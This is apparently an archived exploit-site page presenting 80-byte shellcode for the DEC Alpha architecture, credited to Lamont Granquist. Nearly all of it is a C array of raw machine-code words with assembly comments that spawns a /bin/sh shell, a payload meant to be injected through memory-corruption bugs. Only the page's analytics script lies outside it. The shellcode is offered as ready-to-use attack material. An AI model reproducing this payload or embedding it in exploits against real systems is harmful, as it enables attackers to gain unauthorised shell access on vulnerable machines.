<html><head><title>Alpha - /bin/sh - 80 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
   Lamont Granquist
   lamontg@hitl.washington.edu
   lamontg@u.washington.edu
*/

int rawcode[] = {
  0x2230fec4,              /* subq $16,0x13c,$17 [2000]*/
  0x47ff0412,              /* clr $18            [2000]*/
  0x42509532,              /* subq $18, 0x84     [2000]*/
  0x239fffff,              /* xor $18, 0xffffffff, $18 */
  0x4b84169c,
  0x465c0812,
  0xb2510134,              /* stl $18, 0x134($17)[2000]*/
  0x265cff98,              /* lda $18, 0xff978cd0[2000]*/
  0x22528cd1,
  0x465c0812,              /* xor $18, 0xffffffff, $18 */
  0xb2510140,              /* stl $18, 0x140($17)[2000]*/
  0xb6110148,              /* stq $16,0x148($17) [2000]*/
  0xb7f10150,              /* stq $31,0x150($17) [2000]*/
  0x22310148,              /* addq $17,0x148,$17 [2000]*/
  0x225f013a,              /* ldil $18,0x13a     [2000]*/
  0x425ff520,              /* subq $18,0xff,$0   [2000]*/
  0x47ff0412,              /* clr $18            [2000]*/
  0xffffffff,              /* call_pal 0x83      [2000]*/
  0xd21fffed,              /* bsr $16,$l1    ENTRY     */
  0x6e69622f,              /* .ascii &quot;/bin&quot;      [2000]*/
  /* .ascii &quot;/sh\0&quot; is generated */
};


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
